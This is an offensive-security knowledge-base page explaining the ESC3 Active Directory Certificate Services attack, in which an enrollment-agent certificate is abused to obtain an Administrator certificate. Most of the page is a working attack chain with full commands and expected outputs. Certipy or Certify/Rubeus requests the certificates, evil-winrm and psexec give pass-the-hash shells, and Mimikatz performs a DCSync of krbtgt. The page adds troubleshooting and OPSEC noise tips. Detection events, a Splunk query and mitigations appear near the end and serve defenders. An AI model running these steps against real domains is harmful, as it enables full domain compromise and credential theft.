---
title: "ESC3 — Misconfigured Enrollment Agent Templates"
description: "ESC3 exploits the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1). In legitimate AD environments, this EKU exists for scenarios like IT…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Mimikatz", "Rubeus", "Certipy", "Evil-WinRM", "OpenSSL"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC3 — Misconfigured Enrollment Agent Templates.md"
---
# ESC3 — Misconfigured Enrollment Agent Templates

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Certificate Template Misconfiguration |
| **Difficulty** | Medium (two-stage attack) |
| **Pre-requisites** | CRA template + second auth template, both enrollable |
| **Tools** | Certipy, Certify.exe, Rubeus |
| **OPSEC Noise** | Medium — two cert requests, requester ≠ subject on second |
| **One-liner** | Request an Enrollment Agent cert (Template 1), then use it to request a Client Auth cert on behalf of Administrator (Template 2). |

***

## What Is ESC3?

ESC3 exploits the **Certificate Request Agent EKU** (OID `1.3.6.1.4.1.311.20.2.1`). In legitimate AD environments, this EKU exists for scenarios like IT helpdesk staff requesting smart card certificates on behalf of users who can't do it themselves — a perfectly valid business use case. The abuse happens when this functionality is misconfigured and exposed to low-privileged accounts.

Where ESC1 and ESC2 are single-template attacks, **ESC3 is fundamentally a two-template, two-certificate attack**. You need:
- **Template 1 (CRA Template):** Grants you an Enrollment Agent certificate
- **Template 2 (Target Template):** A second template that allows agent-based enrollment and has a domain authentication EKU

Think of it like this — Template 1 gives you a **staff badge** that says "I'm allowed to request on behalf of others." Template 2 is the **door** you then use that badge to walk through, as any user you choose.

***

## The Two Circumstances That Enable ESC3

ESC3 has two distinct vulnerability circumstances that must each exist — one on each template:

### Circumstance 1 — The CRA Template (Template 1)
| Condition | What to Check |
|-----------|---------------|
| Low-priv users have enrollment rights | `Enrollment Rights: DOMAIN\Domain Users` |
| Manager Approval is off | `Requires Manager Approval: False` |
| No authorized signatures required | `Authorized Signatures Required: 0` |
| Template has **Certificate Request Agent EKU** | `Enrollment Agent: True` / EKU OID `1.3.6.1.4.1.311.20.2.1` |

### Circumstance 2 — The Target Template (Template 2)
| Condition | What to Check |
|-----------|---------------|
| Low-priv users have enrollment rights | `Enrollment Rights: DOMAIN\Domain Users` |
| Manager Approval is off | `Requires Manager Approval: False` |
| **Enrollment Agent Restrictions NOT enforced on the CA** | CA output shows `Enrollment Agent Restrictions: None` |
| Template has a **domain authentication EKU** | `Client Authentication: True` |
| If schema version > 1: must have an Application Policy Issuance Requirement requiring CRA EKU | Check `Authorized Signatures Required` and `Application Policies` |

> 💡 The built-in **`User`** template is almost always a valid Template 2 target in real environments because it is version 1 schema — meaning it doesn't require authorized signatures, and it has Client Authentication EKU. Always check if it's available before looking for something exotic.

***

## Step 0 — Enumeration

```bash
# Standard vulnerable scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout
```

### What Vulnerable ESC3 Output Looks Like

**Template 1 (CRA Template) — what you're looking for:**
```
Template Name                       : ESC3-CRA
Enabled                             : True
Client Authentication               : False
Enrollment Agent                    : True        ← THE key flag
Any Purpose                         : False
Enrollee Supplies Subject           : False
Extended Key Usage                  : Certificate Request Agent   ← OID 1.3.6.1.4.1.311.20.2.1
Requires Manager Approval           : False
Authorized Signatures Required      : 0
Permissions
  Enrollment Rights : DOMAIN\Domain Users

[!] Vulnerabilities
  ESC3 : 'DOMAIN\Domain Users' can enroll and template has Certificate Request Agent EKU set
```

**CA output — confirm no Enrollment Agent Restrictions:**
```
CA Name                             : DOMAIN-CA
Enrollment Agent Restrictions       : None        ← Required for attack to work
```

**Template 2 (Target Template) — what you're looking for:**
```
Template Name                       : User
Enabled                             : True
Client Authentication               : True        ← Auth EKU ✓
Requires Manager Approval           : False
Authorized Signatures Required      : 0
Permissions
  Enrollment Rights : DOMAIN\Domain Users
```

***

## The Full Attack Chain — Linux (Certipy)

### Step 1 — Request Your Enrollment Agent Certificate (Template 1)

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'ESC3-CRA'

# Output: lowpriv.pfx
# This is your Enrollment Agent weapon — treat it carefully
```

**Expected output:**
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with multiple identities
[*] Saving certificate and private key to 'lowpriv.pfx'
```

> ⚠️ Notice that unlike ESC1/ESC2, there is **no `-upn` flag here**. You are simply requesting the CRA cert for yourself. The impersonation happens in Step 2.

***

### Step 2 — Use Agent Cert to Request ON BEHALF OF Administrator (Template 2)

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'User' \
  -on-behalf-of 'domain\administrator' \
  -pfx lowpriv.pfx

# Output: administrator.pfx
```

**Expected output:**
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 13
[*] Got certificate with UPN 'administrator@domain.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

> 💡 The `-on-behalf-of` value uses **`DOMAIN\username`** format (backslash), not UPN format. Get this wrong and you'll get an error. Use the NetBIOS domain name, not the FQDN.

> 💡 The `-pfx` flag here points to the **Enrollment Agent cert** you got in Step 1 — Certipy uses it to co-sign the CSR on behalf of the target user.

***

### Step 3 — Authenticate as Administrator

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET
```

**Expected output:**
```
[*] Using principal: 'administrator@domain.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@domain.htb': aad3b435b51404eeaad3b435b51404ee:NTHASH
```

***

### Step 4 — Shell

```bash
# Kerberos TGT
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i DC01.domain.htb -r domain.htb

# Pass-the-Hash
evil-winrm -i $TARGET -u administrator -H <NTHASH>
psexec.py administrator@$TARGET -hashes :NTHASH
```

***

## Full Attack Chain — Windows (Certify.exe + Rubeus)

```powershell
# ── STEP 1: Get Enrollment Agent Certificate ────────────────────────────────
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:ESC3-CRA
# Copy cert.pem output, save to file, then convert:
openssl pkcs12 -in agent.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out agent.pfx
# Leave password blank

# ── STEP 2: Use Agent Cert to Enroll on Behalf of Administrator ──────────────
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:User /onbehalfof:domain\administrator /enrollcert:agent.pfx /enrollcertpw:""
# Copy cert.pem output, convert:
openssl pkcs12 -in admin.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx

# ── STEP 3: Get TGT + NT Hash via Rubeus ────────────────────────────────────
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /getcredentials /nowrap

# ── STEP 4: Import ticket and use ───────────────────────────────────────────
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<base64ticket>

# DCSync from the injected session
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

***

## ESC3 Visual Attack Flow

```
[lowpriv@domain.htb]
        │
        │  certipy req -template ESC3-CRA
        ▼
[lowpriv.pfx] ← Enrollment Agent Certificate (CRA EKU)
        │
        │  certipy req -template User
        │              -on-behalf-of domain\administrator
        │              -pfx lowpriv.pfx
        ▼
[administrator.pfx] ← Certificate issued FOR Administrator
        │
        │  certipy auth -pfx administrator.pfx
        ▼
[TGT + NT Hash for Administrator]
        │
        ▼
[DOMAIN ADMIN]
```

***

## ESC1 vs ESC2 vs ESC3 — Side by Side

| | ESC1 | ESC2 | ESC3 |
|---|---|---|---|
| **Templates needed** | 1 | 1 | **2** |
| **Steps** | 2 | 2 (Path A) / 3 (Path B) | **3** |
| **Key flag** | `ENROLLEE_SUPPLIES_SUBJECT` | `Any Purpose` / No EKU | `Certificate Request Agent EKU` |
| **SAN injection** | ✅ Direct via `-upn` | ✅ Path A / ❌ Path B | ❌ Uses `-on-behalf-of` |
| **CA restriction matters** | ❌ | ❌ | ✅ `Enrollment Agent Restrictions: None` required |
| **Certipy key flag** | `-upn` | `-upn` / `-on-behalf-of` | `-on-behalf-of` + `-pfx` |

***

## Common Errors and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `Got error while trying to request certificate` on Step 2 | CA has Enrollment Agent Restrictions set | Check CA output for `Enrollment Agent Restrictions` — if it's not `None`, restrictions are blocking agent enrollment |
| `The NETBIOS connection with the remote host timed out` | RPC timeout | Re-run without `-dc-host` flag |
| `Certificate has no object SID` on Step 2 | Normal for agent-enrolled certs | Proceed — auth should still work |
| `KDC_ERR_CLIENT_NOT_TRUSTED` on auth | Cert not trusted by DC | Ensure CA cert is in NTAuthCertificates — unlikely issue in a real domain |

***

## Detection Indicators

- **Event ID 4887** — CA issued a certificate where the `Requester` and `Subject` are **different users** — the clearest sign of ESC3 exploitation
- **Event ID 4898** — A certificate template with Certificate Request Agent EKU was loaded during enrollment
- Splunk query to detect ESC3-vulnerable template usage:
```
CertificateRequestAgentEKU == "TRUE" 
AND ManagerApprovalEnabled == "FALSE" 
AND NumAuthorizedSignatures == 0 
AND DomainOrAuthenUsersCanEnrollOrAutoEnroll == "TRUE"
```

***

## Mitigation

- **Enable Enrollment Agent Restrictions** on the CA — restrict which agents can enroll on behalf of which users, and for which templates
- **Remove `Certificate Request Agent` EKU** from any template that doesn't explicitly require it for a business purpose
- **Restrict enrollment rights** on CRA templates — these should never be available to `Domain Users` or `Authenticated Users`
- **Schema Version 2 templates** — configure `Authorized Signatures Required: 1` and set the Application Policy to `Certificate Request Agent` — this forces the CA to validate the signing cert is a proper CRA cert, adding a layer of control

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| CRA cert request (Step 1) | Event ID 4886/4887 | 🟢 Low |
| On-behalf-of request (Step 2) | Event ID 4887 (requester ≠ subject) | 🟡 Medium |
| Authentication (Step 3) | Event ID 4768 (TGT) | 🟢 Low |

> 💡 The on-behalf-of request in Step 2 is the noisiest part — the CA logs clearly show a different requester and subject. This is the primary detection opportunity.

Sources
 AD CS Certificate and Security Configuration Exploits - SecureW2 https://www.securew2.com/blog/ad-cs-certificate-and-security-configuration-exploits
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 Active Directory Certificate Services (ADCS – ESC3) - RBT Security https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/
 Common ADCS Vulnerabilities: Logging, Exploitation ... - Lares Labs https://labs.lares.com/adcs-exploits-investigations-pt2/
 ADCS ESC3: Enrollment Agent Template - hendryadrian.com https://www.hendryadrian.com/adcs-esc3-enrollment-agent-template/
 Active Directory Certificate Services (ADCS) is vulnerable to ESC3 ... https://www.facebook.com/cybersna/posts/active-directory-certificate-services-adcs-is-vulnerable-to-esc3-certificate-att/999663635697077/
 ADCS ESC3 Enrollment Agent Exploitation - Active Directory - Scribd https://www.scribd.com/document/870626405/ADCS-ESC3-Enrollment-Agent-Template
 Active Directory Certificate Services (AD CS) Exploitation - VOIDREAD https://voidread.pages.dev/posts/ad-cs-abuses/
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.buaq.net/go-365639.html
 Active-Directory-Certificate-Services-abuse/ADCS.md at main - GitHub https://github.com/RayRRT/Active-Directory-Certificate-Services-abuse/blob/main/ADCS.md
 An Expert Guide to Fortifying Active Directory Certificate ... https://www.nccgroup.com/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/
 Detecting ADCS Privilege Escalation: How Misconfigured ... https://hawk-eye.io/2025/09/detecting-adcs-privilege-escalation-how-misconfigured-certificates-expose-active-directory/
 Exploiting ESC3 to compromise the domain | Attacking ADCS full course https://www.youtube.com/watch?v=sMTwPU-FTuk
 Abusing Active Directory Certificate Services (ADCS) | ESC3 Attack Explained https://www.youtube.com/watch?v=T6-q_R7L5GE
